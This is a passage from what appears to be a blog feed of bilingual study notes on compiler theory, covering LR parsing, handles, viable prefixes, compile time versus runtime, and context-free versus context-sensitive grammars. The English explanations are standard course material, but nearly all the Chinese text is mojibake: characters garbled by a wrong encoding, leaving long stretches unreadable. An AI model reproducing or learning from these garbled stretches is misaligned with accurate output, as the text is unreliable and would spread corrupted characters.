XX\)</span></li><li>$X -&gt; aX | b $</li></ul><p>Now, consider a string in <span class="math inline">\(L(S)\)</span>say aabb. We can parse it as follows by left most derivation â€“ replacingthe left most non-terminal in each step, or right most derivation â€“replacing the rightmost non-terminal in each step.</p><p>è€ƒè™‘ä¸€ä¸ªç¬¦åˆè¯¥æ–‡æ³•çš„å­—ç¬¦ä¸²aabbï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§æœ€å·¦æ¨å¯¼è§£æå®ƒï¼ˆæ¯ä¸€æ­¥æ›¿æ¢æœ€å·¦è¾¹çš„éç»ˆç»“ç¬¦ï¼‰æˆ–è€…ä¹Ÿå¯ä»¥æŒ‰ç…§æœ€å³æ¨å¯¼è§£æå®ƒï¼ˆæ¯ä¸€æ­¥æ›¿æ¢æœ€å³è¾¹çš„éç»ˆç»“ç¬¦ï¼‰</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230619000054295.png"alt="image-20230619000054295" /><figcaption aria-hidden="true">image-20230619000054295</figcaption></figure><p><strong>ä¸Šé¢çš„æœ€å³æ¨å¯¼è¢«ç”¨åœ¨bottom-up parsing</strong></p><blockquote><ul><li><em>Any string derivable from the start symbol is a sentential formâ€” it becomes a sentence if it contains only terminals</em></li><li><em>A sentential form that occurs in the leftmost derivation of somesentence is called left-sentential form</em></li><li><em>A sentential form that occurs in the rightmost derivation ofsome sentence is called right-sentential form</em></li></ul></blockquote><p>å†æ¬¡è€ƒè™‘å­—ç¬¦ä¸²aabbï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ–¹æ³•è§£æï¼š</p><p>ä»å·¦è‡³å³æ‰«æè¾“å…¥ï¼Œå¦‚æœå­˜åœ¨å­ä¸²åŒ¹é…ä»»ä½•æ¨å¯¼å¼çš„<strong>å³ä¾§</strong>(RHS,right hand of string), ç”¨è¯¥æ¨å¯¼å¼çš„<strong>å·¦ä¾§</strong>æ›¿æ¢è¯¥å­—ç¬¦ä¸²</p><p>å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol type="1"><li>â€˜aâ€™ â€œabbâ€ â€“ ä¸å­˜åœ¨RHSåŒ¹é…'a'</li><li>â€˜aaâ€™ â€œbbâ€ â€“ ä¸å­˜åœ¨RHSåŒ¹é…'a' æˆ–è€… 'aa'</li><li>â€˜aabâ€™ â€œbâ€ â€“ RHS of <span class="math inline">\(Xâ†’b\)</span> matchesâ€˜bâ€™ (first b from left) and so we write as</li></ol><p>Consider the string aabb again. We will see a method to parsethis:</p><ol type="1"><li>Scan the input from left to right and see if any substring matchesthe RHS of any production. If so, replace that substring by the LHS ofthe production.</li></ol><p>So, for â€œaabbâ€ we do as follows</p><ol type="1"><li>â€˜aâ€™ â€œabbâ€ â€“ No RHS matches â€˜aâ€™</li><li>â€˜aaâ€™ â€œbbâ€ â€“ No RHS matches â€˜aâ€™ or â€˜aaâ€™</li><li>â€˜aabâ€™ â€œbâ€ â€“ RHS of <span class="math inline">\(Xâ†’b\)</span> matchesâ€˜bâ€™ (first b from left) and so we write as aaXb</li><li>â€˜aaXâ€™ â€œbâ€ â€“ RHS of <span class="math inline">\(Xâ†’aX\)</span> matchesâ€œaXâ€ and so we write as</li><li>aXb â€“ Again RHS of <span class="math inline">\(Xâ†’aX\)</span> matchesâ€œaXâ€ and we get</li><li>Xb â€“ RHS of <span class="math inline">\(Xâ†’b\)</span> matches â€œbâ€ andwe get</li><li>XX â€“ RHS of <span class="math inline">\(Sâ†’XX\)</span>matches XX andwe get</li><li>S â€“ the start symbol.</li></ol><p>Now what we did here is nothing but a bottom-up parsing. Bottom-upbecause we started from the string and not from the grammar. Here, weapplied a sequence of reductions, which are as follows: <spanclass="math display">\[aabb â†’ aaXb â†’ aXb â†’ Xb â†’ XX â†’ S\]</span> If we go up and see the Rightmost derivation of the stringâ€œaabbâ€, what we got is the same but in REVERSE order. i.e., our bottomup parsing is doing reverse of the RIGHTMOSTderivation(ä»”ç»†è§‚å¯Ÿä¸Šè¿°çš„æ›¿æ¢è¿‡ç¨‹å’Œæœ€å¼€å§‹çš„æœ€å³æ¨å¯¼çš„é¡ºåºæ˜¯ç›¸åçš„).<strong>So, we can call it an <span class="math inline">\(LR\)</span>parser â€“$ L$ for scanning the input from Left side and <spanclass="math inline">\(R\)</span> for doing a Rightmostderivation.</strong></p><p>In our parsing we substituted the RHS of a production at each step.This substituted â€œsubstringâ€ is called a HANDLE and are shown in<strong>BOLD</strong>below(åœ¨æ¨å¯¼è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åœ¨æ¯ä¸€æ­¥æ›¿æ¢äº†å­ä¸²ï¼Œè¿™äº›å­ä¸²ç§°ä¸ºHandleï¼Œåœ¨ä¸‹é¢è¢«åŠ ç²—äº†).<span class="math display">\[aa\bold bb â†’ a\bold a \bold Xb â†’ \bold a \bold Xb â†’ X\bold b â†’ \bold X\bold X â†’ S\]</span> Formally a handle is defined as (Greek letters used to denotea string of terminals and non-terminals)</p><blockquote><p>"<em>A handle of a right sentential form â€˜</em>Î³<em>â€™</em>(Î³=Î±Î´Î²<em>) is a production</em> Eâ†’Î´ <em>and a position in</em> Î³<em>where</em> Î´ <em>can be found and substituted by</em> E <em>to getthe</em> <strong>previous step</strong> <em>in the right most derivationof</em> Î³ <em>â€” previous and not â€œnextâ€ because we are doing rightmostderivation in REVERSE. Handle can be given as a production or just theRHS of a production.</em></p></blockquote><p>The handle is not necessarily starting from the left most position asclear from the above example(ä»ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹åˆ°handleä¸ä¸€å®šå¼€å§‹äºRHSçš„æœ€å·¦è¾¹). There is importanceto the input string which occurs to the left of the handle(æ‰€è°“çš„å¯è¡Œå‰ç¼€å°±æ˜¯å½“å‰handleçš„æ‰€æœ‰å‰ç¼€). For example for the handles ofâ€œaabbâ€, we can have the following set of prefixes</p><table><tbody><tr class="odd"><td>aa<strong>b</strong>b</td><td>{a, aa, aab}</td></tr><tr class="even"><td>aa<strong>X</strong>b</td><td>{a, aa, aaX}</td></tr><tr class="odd"><td>a<strong>X</strong>b</td><td>{a, aX}</td></tr><tr class="even"><td>X<strong>b</strong></td><td>{X, Xb}</td></tr><tr class="odd"><td><strong>XX</strong></td><td>{X, XX}</td></tr></tbody></table><p>These set of prefixes are called Viable Prefixes(è¿™äº›å‰ç¼€é›†åˆè¢«ç§°ä¸ºå¯è¡Œå‰ç¼€). Formally</p><blockquote><p>" Viable prefixes are the prefixes of right sentential forms that donot extend beyond the end of its handle.</p><p>i.e., a viable prefix either has no handle or just one possiblehandle on the extreme RIGHT which can be reduced.</p></blockquote><p>We will see later that viable prefixes can also be defined as the setof prefixes of the right-sentential form that can appear on the stack ofa shift-reduce parser. Also, the set of all viable prefixes of the rightsentential forms of a grammar is a REGULAR LANGUAGE. i.e., viableprefixes can be recognized by using a FINITE AUTOMATA. Using this FINITEAUTOMATA and a stack we get the power of a Push Down Automata and thatis how we can parse context-free languages.</p><p>åœ¨åé¢ï¼Œå¯è¡Œå‰ç¼€ä¹Ÿå¯ä»¥è¢«å®šä¹‰ä¸ºå‡ºç°åœ¨shift-reduceè§£æå™¨çš„æœ€å³æ¨å¯¼å¼çš„å‰ç¼€é›†åˆã€‚å½“ç„¶ï¼Œæ‰€æœ‰çš„å¯è¡Œå‰ç¼€æ˜¯æ­£åˆ™è¯­è¨€ï¼Œæ‰€ä»¥ï¼Œå¯è¡Œå‰ç¼€å¯ä»¥è¢«æœ‰é™è‡ªåŠ¨æœºè¯†åˆ«ã€‚ä½¿ç”¨æœ‰é™è‡ªåŠ¨æœºå’Œstackå°±å¯ä»¥PushDown Automataï¼Œè¿™æœ¬è´¨ä¸Šå°±æ˜¯åœ¨è§£æä¸Šä¸‹æ— å…³æ–‡æ³•ã€‚</p><p><strong>å‚è€ƒæ–‡çŒ®</strong>ï¼šhttps://web.stanford.edu/class/archive/cs/cs143/cs143.1128/handouts/100%20Bottom-Up%20Parsing.pdf</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 12 Conclusion</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%BA%8C/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p>è¿è¡Œæ—¶å’Œç¼–è¯‘æ—¶çš„åˆ’åˆ†åŠæ¦‚å¿µï¼ˆå¹¿ä¹‰å’Œç‹­ä¹‰ï¼‰ï¼Ÿ</p><p>compile: The instructions or <strong>source code written usinghigh-level language is required to get converted to machine code for acomputer to understand.</strong> During compile time, the source code istranslated to a byte code like from <ahref="https://www.baeldung.com/java-classes-objects">.java to.class</a>. During compile time the compiler check for the syntax,semantic, and type of the code.</p><h3 id="inputs-and-outputs">Inputs and Outputs</h3><p>Inputs and outputs during compile time are the following:</p><ul><li><strong>Inputs â€“</strong> Source code, dependent files, interfaces,libraries required for successful compilation of the code</li><li><strong>Outputs â€“</strong> On successful compilation, a compliedcode (<ahref="https://www.sciencedirect.com/topics/computer-science/assembly-code">assemblycode</a> or <ahref="https://www.cs.tufts.edu/comp/40/calendar/lectures/05-CompilationSteps.pdf">relocatableobject code</a>), otherwise <ahref="https://student.cs.uwaterloo.ca/~cs133/Resources/Java/Debugging/compile.shtml">compiletime error</a> messages</li></ul><p>Errors: <strong>During compile time errors occur because of syntaxand semantic.</strong> The syntax error occurs because of the wrongsyntax of the written code. Semantic errors occur in reference tovariable, function, type declarations and type checking.</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŠŠæºä»£ç ç¼–è¯‘æˆè®¡ç®—å™¨å¯ä»¥ç†è§£çš„è¯­è¨€ï¼Œå°±æ˜¯ç¼–è¯‘ï¼Œæ³¨æ„è¿™é‡Œè®¡ç®—æœºå¯ä»¥ç†è§£çš„è¯­è¨€ä¸ä¸€å®šæ˜¯æ±‡ç¼–å’Œæœºå™¨ç ä»€ä¹ˆçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸ç‰¹å®šæ“ä½œç³»ç»Ÿæ— å…³çš„ä¸­é—´è¯­è¨€(å­—èŠ‚ç )ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥æŠŠè¿™äº›æ‰§è¡Œå­—èŠ‚ç çš„è§£é‡Šå™¨æˆ–è€…è™šæ‹Ÿæœºç†è§£ä¸€ä¸ªå°å‹çš„æ“ä½œç³»ç»Ÿã€‚</p><p>Runtime:</p><p><strong>A programâ€™s life cycle is a runtime when the program is inexecution.</strong> Following are the different types of runtimeerrors:</p><ul><li><strong>Division by zero</strong> â€“ when a number is divided by zero(0)</li><li><strong>Dereferencing a null pointer</strong> â€“ when a programattempts to access memory with a NULL</li><li><strong>Running out of memory</strong> â€“ when a computer has nomemory to allocate to programs</li></ul><figure><imgsrc="https://www.baeldung.com/wp-content/ql-cache/quicklatex.com-25c5794ab97de69a698576bf136da63a_l3.svg"alt="Rendered by QuickLaTeX.com" /><figcaption aria-hidden="true">Rendered by QuickLaTeX.com</figcaption></figure><p>é™æ€ä½œç”¨åŸŸå’ŒåŠ¨æ€ä½œç”¨åŸŸçš„å®ç°æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</p><p>é™æ€ç±»å‹æ£€æŸ¥å’ŒåŠ¨æ€ç±»å‹æ£€æŸ¥:</p><p>é¦–å…ˆå¾—å…ˆæ˜ç¡®ä»€ä¹ˆæ˜¯ç¼–è¯‘æ—¶ä»€ä¹ˆæ˜¯è¿è¡Œæ—¶ï¼Œ</p><p>ä¸€èˆ¬çš„è¿è¡Œæ—¶è¡¨ç¤ºä»ä¸Šè‡³ä¸‹æ‰§è¡Œæ±‡ç¼–ä»£ç ï¼Œä½†è¿˜æœ‰äº›è¿è¡Œæ—¶åŒ…å«ä¸­é—´ä»£ç æ‰§è¡Œæ—¶çš„è¿è¡Œæ—¶ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>Python =&gt; (ç¼–è¯‘) pyc(ä¸­é—´ä»£ç æ–‡ä»¶) =&gt; (è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œ) ç»“æœ</p><p>è¿™é‡Œçš„pyc =&gt;ç»“æœå°±æ˜¯è¿è¡Œæ—¶ï¼Œè¿™ä¸€æ­¥å…¶å®åŒ…å«äº†æŠŠä¸­é—´ä»£ç è½¬ä¸ºæ±‡ç¼–oræœºå™¨æŒ‡ä»¤çš„è¿‡ç¨‹ï¼Œä»¥åŠä¼˜åŒ–å’Œç±»å‹æ£€æŸ¥ï¼Œåƒåœ¾å›æ”¶ç­‰ï¼Œä½†å…¶å®ç”¨æˆ·æ„ŸçŸ¥ä¸åˆ°è¿™äº›è¿‡ç¨‹ï¼Œæ„Ÿè§‰å¥½åƒå­—èŠ‚ç ç›´æ¥è¢«è¿è¡Œäº†ï¼Œæ‰€ä»¥è¿™äº›ä¹Ÿè¢«åŒ…å«åœ¨è¿è¡Œæ—¶é‡Œï¼Œ</p><p>æ€è€ƒï¼šç¼–è¯‘+AIä¼˜åŒ–ï¼Ÿ</p><p>ä¸Šä¸‹æœ‰å…³æ–‡æ³•çš„ç†è§£ï¼Œä»€ä¹ˆè¯­è¨€ä¼šç”¨ä¸Šä¸‹æœ‰å…³æ–‡æ³•ï¼Œä¸Šä¸‹æ— å…³æ–‡vsä¸Šä¸‹æœ‰å…³æ–‡æ³•çš„æ¯”è¾ƒï¼Œå„æœ‰ä»€ä¹ˆç‰¹ç‚¹</p><p>é¢˜ä¸»çš„ä¸»è¦ç–‘æƒ‘åº”è¯¥åœ¨äºï¼šä»€ä¹ˆæ˜¯ä¸Šä¸‹æ–‡ï¼Œä¸Šä¸‹æ–‡åœ¨å“ªé‡Œï¼Ÿä¸ºä»€ä¹ˆè¯´è¿™ä¸ªæ–‡æ³•ä¸Šä¸‹æ–‡æ— å…³ï¼Ÿ</p><p>ç­”æ¡ˆå°±æ˜¯ï¼šåœ¨åº”ç”¨ä¸€ä¸ªäº§ç”Ÿå¼è¿›è¡Œæ¨å¯¼æ—¶ï¼Œå‰åå·²ç»æ¨å¯¼å‡ºçš„éƒ¨åˆ†ç»“æœå°±æ˜¯ä¸Šä¸‹æ–‡ã€‚ä¸Šä¸‹æ–‡æ— å…³çš„æ„æ€çš„ï¼Œåªè¦æ–‡æ³•çš„å®šä¹‰é‡Œæœ‰æŸä¸ªäº§ç”Ÿå¼ï¼Œä¸ç®¡ä¸€ä¸ª<ahref="https://www.zhihu.com/search?q=éç»ˆç»“ç¬¦&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">éç»ˆç»“ç¬¦</a>å‰åçš„ä¸²æ˜¯ä»€ä¹ˆï¼Œå°±å¯ä»¥åº”ç”¨ç›¸åº”çš„äº§ç”Ÿå¼è¿›è¡Œæ¨å¯¼ã€‚ï¼ˆä»å½¢å¼ä¸Šæ¥çœ‹ï¼Œå°±æ˜¯äº§ç”Ÿå¼çš„å·¦è¾¹éƒ½æ˜¯å•ç‹¬ä¸€ä¸ªéç»ˆç»“ç¬¦ï¼Œå³å½¢å¦‚S-&gt; ...ï¼Œè€Œä¸æ˜¯éç»ˆç»“ç¬¦å·¦å³è¿˜æœ‰åˆ«çš„ä¸œè¥¿ï¼Œä¾‹å¦‚ aSb -&gt; ...ï¼‰</p><p>ä½œè€…ï¼šQuokkaé“¾æ¥ï¼šhttps://www.zhihu.com/question/21833944/answer/307309365æ¥æºï¼šçŸ¥ä¹è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p><p>è¿™ä¹ˆæè¿°æœ‰ç‚¹å„¿æŠ½è±¡ï¼Œæˆ‘ä¸¾ä¸€ä¸ª<ahref="https://www.zhihu.com/search?q=è‡ªç„¶è¯­è¨€&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">è‡ªç„¶è¯­è¨€</a>çš„ä¾‹å­ï¼š</p><p><strong><ahref="https://www.zhihu.com/search?q=ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•</a>ï¼š</strong></p><p>äº§ç”Ÿå¼ï¼š</p><p>Sent -&gt; S V O</p><p>S -&gt; äºº | å¤©</p><p>V -&gt; åƒ | ä¸‹</p><p>O -&gt; é›¨ | é›ª | é¥­ | è‚‰</p><p>å…¶ä¸­è‹±æ–‡å­—æ¯éƒ½æ˜¯éç»ˆç»“ç¬¦ï¼ˆSVO åˆ†åˆ«è¡¨ç¤º<ahref="https://www.zhihu.com/search?q=ä¸»è°“å®¾&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">ä¸»è°“å®¾</a>ï¼‰ï¼Œæ±‰å­—éƒ½æ˜¯ç»ˆç»“ç¬¦ã€‚</p><p>è¿™ä¸ªæ–‡æ³•å¯ä»¥ç”Ÿæˆå¦‚ä¸‹å¥å­ï¼ˆå…± 2<em>2</em>4=16ç§ç»„åˆï¼Œæ‡’å¾—å†™å…¨äº†ï¼Œç®€å•å†™ 7 ç§æ„æ€æ„æ€ï¼‰ï¼š</p><p>ï½›äººåƒé¥­ï¼Œå¤©ä¸‹é›¨ï¼Œäººåƒè‚‰ï¼Œå¤©ä¸‹é›ªï¼Œäººä¸‹é›ªï¼Œå¤©ä¸‹é¥­ï¼Œå¤©åƒè‚‰ï¼Œâ€¦â€¦ï½</p><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¸­æœ‰ä¸€äº›æ­é…åœ¨è¯­ä¹‰ä¸Šæ˜¯ä¸æ°å½“çš„ï¼Œä¾‹å¦‚â€œå¤©åƒè‚‰â€ã€‚å…¶ï¼ˆæœ€å·¦ï¼‰æ¨å¯¼è¿‡ç¨‹ä¸ºï¼š</p><p>Sent -&gt; SVO -&gt; <ahref="https://www.zhihu.com/search?q=å¤©VO&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">å¤©VO</a>-&gt; å¤©åƒO -&gt; å¤©åƒè‚‰</p><p>ä½†æ˜¯ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•é‡Œï¼Œå› ä¸ºæœ‰â€œV -&gt; åƒ | ä¸‹â€è¿™æ ·ä¸€æ¡äº§ç”Ÿå¼ï¼ŒVå°±æ°¸è¿œéƒ½å¯ä»¥æ¨å‡ºâ€œåƒâ€è¿™ä¸ªè¯ï¼Œå®ƒå¹¶ä¸åœ¨ä¹åº”ç”¨â€œV -&gt; åƒ |ä¸‹â€è¿™ä¸ªäº§ç”Ÿå¼è¿›è¡Œæ¨å¯¼æ—¶ V æ‰€åœ¨çš„ä¸Šä¸‹æ–‡ï¼ˆåœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œå°±æ˜¯â€å¤©VOâ€œä¸­ Vå·¦å³ä¸¤è¾¹çš„å­—ç¬¦ä¸²â€å¤©â€œå’Œâ€Oâ€œï¼‰ã€‚äº‹å®ä¸Šï¼Œåœ¨ Væ¨å‡ºâ€œåƒâ€è¿™ä¸€æ­¥ï¼Œå®ƒçš„å·¦è¾¹æ˜¯â€œå¤©â€è¿™ä¸ªè¯ï¼Œè€Œâ€å¤©â€œå’Œâ€åƒâ€œä¸æ­é…ï¼Œå¯¼è‡´æœ€åçš„å¥å­è¯»èµ·æ¥å¾ˆå¥‡æ€ªã€‚</p><p>é‚£<strong><ahref="https://www.zhihu.com/search?q=ä¸Šä¸‹æ–‡æœ‰å…³æ–‡æ³•&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">ä¸Šä¸‹æ–‡æœ‰å…³æ–‡æ³•</a></strong>å‘¢ï¼Ÿäº§ç”Ÿå¼å¯ä»¥å®šä¹‰ä¸ºï¼ˆå…¶ä¸­å‰ä¸¤æ¡äº§ç”Ÿå¼ä»æ˜¯ä¸Šä¸‹æ–‡æ— å…³çš„ï¼Œåå››æ¡åˆ™æ˜¯ä¸Šä¸‹æ–‡æœ‰å…³çš„ï¼‰ï¼š</p><p>Sent -&gt; S V O</p><p>S -&gt; äºº | å¤©</p><p>äººV -&gt; äººåƒ</p><p>å¤©V -&gt; å¤©ä¸‹</p><p>ä¸‹O -&gt; ä¸‹é›¨ | ä¸‹é›ª</p><p>åƒO -&gt; åƒé¥­ | åƒè‚‰</p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå¯¹ V çš„æ¨å¯¼è¿‡ç¨‹æ–½åŠ äº†çº¦æŸï¼šè™½ç„¶ Vè¿˜æ˜¯èƒ½æ¨å‡ºâ€åƒâ€œå’Œâ€ä¸‹â€œä¸¤ä¸ªè¯ï¼Œä½†æ˜¯ä»…ä»…å½“ Vå·¦è¾¹æ˜¯â€äººâ€œæ—¶ï¼Œæ‰å…è®¸å®ƒæ¨å¯¼å‡ºâ€åƒâ€œï¼›è€Œå½“ Vå·¦è¾¹æ˜¯â€å¤©â€œæ—¶ï¼Œå…è®¸å®ƒæ¨å¯¼å‡ºâ€ä¸‹â€œã€‚è¿™æ ·é€šè¿‡ä¸Šä¸‹æ–‡çš„çº¦æŸï¼Œå°±ä¿è¯äº†ä¸»è°“æ­é…çš„ä¸€è‡´æ€§ã€‚ç±»ä¼¼åœ°ï¼ŒåŒ…å«O çš„äº§ç”Ÿå¼ä¹Ÿçº¦æŸäº†åŠ¨å®¾æ­é…çš„ä¸€è‡´æ€§ã€‚</p><p>è¿™æ ·ä¸€æ¥ï¼Œè¿™ä¸ªè¯­è¨€åŒ…å«çš„å¥å­å°±åªæœ‰ï½›<ahref="https://www.zhihu.com/search?q=äººåƒé¥­ï¼Œå¤©ä¸‹é›¨ï¼Œäººåƒè‚‰ï¼Œå¤©ä¸‹é›ª&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">äººåƒé¥­ï¼Œå¤©ä¸‹é›¨ï¼Œäººåƒè‚‰ï¼Œå¤©ä¸‹é›ª</a>ï½è¿™å››æ¡ï¼Œéƒ½æ˜¯è¯­ä¹‰ä¸Šåˆç†çš„ã€‚</p><p>ä»¥â€äººåƒé¥­â€œä¸ºä¾‹ï¼Œæ¨å¯¼è¿‡ç¨‹ä¸ºï¼š</p><p>Sent -&gt; SVO -&gt; <ahref="https://www.zhihu.com/search?q=äººVO&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">äººVO</a>-&gt; äººåƒO -&gt; äººåƒé¥­</p><p>å…¶ä¸­ç¬¬ä¸‰æ­¥æ¨å¯¼æ˜¯è¿™æ ·çš„ï¼šéç»ˆç»“ç¬¦ V çš„ä¸Šæ–‡æ˜¯â€œäººâ€ï¼Œå› æ­¤å¯ä»¥åº”ç”¨â€œäººV-&gt; äººåƒâ€è¿™æ¡äº§ç”Ÿå¼ï¼Œå¾—åˆ°â€œäººVO -&gt; äººåƒOâ€ã€‚ç¬¬å››æ­¥ä¹Ÿç±»ä¼¼ã€‚</p><p>è€Œ</p><p><ahref="http://www.zhihu.com/people/20529960b7c64153695a7488fb49aeab"><spanclass="citation" data-cites="èŒƒå½¬">@èŒƒå½¬</span></a></p><p>å›ç­”çš„æ˜¯è¯­æ³•çš„æ­§ä¹‰æ€§ï¼Œè¿™å’Œ CFG æ— å…³ã€‚æœ€ç®€å•çš„ä¾‹å­ï¼š</p><p>å‡è®¾æœ‰å¦‚ä¸‹ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coq">S -&gt; S1 | <span class="hljs-type">S2</span><br>S1 -&gt; ab<br>S2 -&gt; AB<br>A -&gt; a<br>B -&gt; b<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯¹äº "ab" è¿™ä¸ªä¸²ï¼Œä¸€ç§æ¨å€’æ–¹å¼æ˜¯ S -&gt; S1 -&gt; abï¼Œå¦ä¸€ç§æ˜¯ S-&gt; S2 -&gt; AB -&gt; aB -&gt; abã€‚å‰ä¸€ç§è¦æŠŠ "ab"åˆèµ·æ¥ï¼Œåä¸€ç§è¦åˆ†å¼€ï¼Œè¿™åªæ˜¯è¯´æ˜è¯¥æ–‡æ³•æœ‰æ­§ä¹‰ï¼Œè€Œä¸èƒ½è¯´è¿™æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡æœ‰å…³æ–‡æ³•ã€‚äº‹å®ä¸Šï¼Œè¿˜æœ‰ä¸€äº›ä¸Šä¸‹æ–‡æ— å…³è¯­è¨€æ˜¯å›ºæœ‰æ­§ä¹‰çš„ï¼ˆèƒ½äº§ç”Ÿè¯¥è¯­è¨€çš„æ¯ä¸€ç§ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•éƒ½æœ‰æ­§ä¹‰ï¼‰ã€‚</p><p>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•å°±æ˜¯è¯´è¿™ä¸ªæ–‡æ³•ä¸­<strong>æ‰€æœ‰çš„äº§ç”Ÿå¼å·¦è¾¹åªæœ‰ä¸€ä¸ªéç»ˆç»“ç¬¦</strong>ï¼Œæ¯”å¦‚ï¼š</p><p>S -&gt; aSb</p><p>S -&gt; ab</p><p>è¿™ä¸ªæ–‡æ³•æœ‰ä¸¤ä¸ªäº§ç”Ÿå¼ï¼Œæ¯ä¸ªäº§ç”Ÿå¼å·¦è¾¹åªæœ‰ä¸€ä¸ªéç»ˆç»“ç¬¦Sï¼Œè¿™å°±æ˜¯ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼Œå› ä¸ºä½ åªè¦æ‰¾åˆ°ç¬¦åˆäº§ç”Ÿå¼å³è¾¹çš„ä¸²ï¼Œå°±å¯ä»¥æŠŠå®ƒå½’çº¦ä¸ºå¯¹åº”çš„éç»ˆç»“ç¬¦ã€‚</p><p>æ¯”å¦‚ï¼š</p><p>aSb -&gt; aaSbb</p><p>S -&gt; ab</p><p>è¿™å°±æ˜¯ä¸Šä¸‹æ–‡ç›¸å…³æ–‡æ³•ï¼Œå› ä¸ºå®ƒçš„ç¬¬ä¸€ä¸ªäº§ç”Ÿå¼å·¦è¾¹æœ‰ä¸æ­¢ä¸€ä¸ªç¬¦å·ï¼Œæ‰€ä»¥ä½ åœ¨åŒ¹é…è¿™ä¸ªäº§ç”Ÿå¼ä¸­çš„Sçš„æ—¶å€™å¿…éœ€ç¡®ä¿è¿™ä¸ªSæœ‰æ­£ç¡®çš„â€œä¸Šä¸‹æ–‡â€ï¼Œä¹Ÿå°±æ˜¯å·¦è¾¹çš„aå’Œå³è¾¹çš„bï¼Œæ‰€ä»¥å«ä¸Šä¸‹æ–‡ç›¸å…³æ–‡æ³•</p><p>åœ¨æ›¿æ¢çš„æ—¶å€™ï¼Œä¸æ˜¯ç›´æ¥æ›¿æ¢ï¼Œè¿˜è¦è€ƒè™‘å·¦è¾¹ç¬¦å·çš„å·¦å³ç¯å¢ƒ</p><p>ç°ä»£ç¼–è¯‘å™¨å’Œå­—èŠ‚ç ï¼Ÿ</p><p>typescriptï¼Ÿ</p><p>ç¼–è¯‘çš„æ¦‚å¿µæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>ä¸ºä»€ä¹ˆæ­£åˆ™è¯­è¨€ä¸èƒ½ç”¨äºæ–‡æ³•è§£æï¼Ÿå› ä¸ºæ­£åˆ™è¯­è¨€æ— æ³•å¤„ç†é€’å½’çš„åµŒå¥—ç»“æ„ï¼Œä¸ä¿¡ä½ ç”¨æ­£åˆ™å†™ä¸€ä¸ªåµŒå¥—ä»»æ„å±‚çº§çš„if-elseè¯•è¯•ï¼Ÿ</p><p>ä¸ºä»€ä¹ˆè¦æœ‰ç©ºè½¬æ¢ï¼šA -&gt; epsilon ?ä¸»è¦æ˜¯æœªæ¥æ¶ˆè€—æŸä¸ªéç»ˆç»“ç¬¦å“ˆï¼Œä»¥é¢„æµ‹ä¸€ä¸ªå­—ç¬¦ä¸ºä¾‹ï¼š</p><p>T[E, t] = a,tæ˜¯ä¸€ä¸ªé¢„æµ‹å­—ç¬¦ï¼Œ<strong>æœ‰ä¸€ä¸ªç‰¹æ®Šçš„æƒ…å†µï¼Œepsilonç”¨äºæ¶ˆè€—æŸä¸ªéç»ˆç»“ç¬¦</strong>ï¼Œå¦‚X-&gt; E 